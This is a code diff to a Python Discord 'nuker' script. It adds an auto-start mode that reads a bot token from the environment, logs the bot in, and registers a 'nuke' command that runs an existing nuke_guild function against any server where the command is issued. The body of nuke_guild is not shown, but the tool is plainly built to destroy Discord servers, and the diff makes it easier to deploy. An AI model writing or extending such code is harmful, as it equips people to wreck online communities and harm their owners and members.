@@ -100,6 +100,33 @@ async def nuke_guild(guild):
     print(f'{r}--------------------------------------------\n\n')
 
 while True:
+    token = environ.get('DISCORD_BOT_TOKEN')
+    prefix = environ.get('DISCORD_PREFIX', '.')
+    
+    if token:
+        print(f'{g}[!] Auto-starting with token from secrets...')
+        print(f'{y}[!] Using prefix: {prefix}')
+        client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
+
+        @client.event
+        async def on_ready():
+            print(f'''
+{g}[+] Logged as {client.user.name}
+{g}[+] Bot in {len(client.guilds)} servers!
+{y}[!] Use command {prefix}nuke in any server to start the process.''')
+
+        @client.command()
+        async def nuke(ctx):
+            await nuke_guild(ctx.guild)
+            await ctx.send("Nuke finished!")
+
+        try:
+            client.run(token)
+        except Exception as error:
+            print(f'{r}{error}')
+            # If auto-start fails, maybe fall back to menu or just exit
+            exit()
+    
     clear()
     choice = input(f'''   
 {baner}                
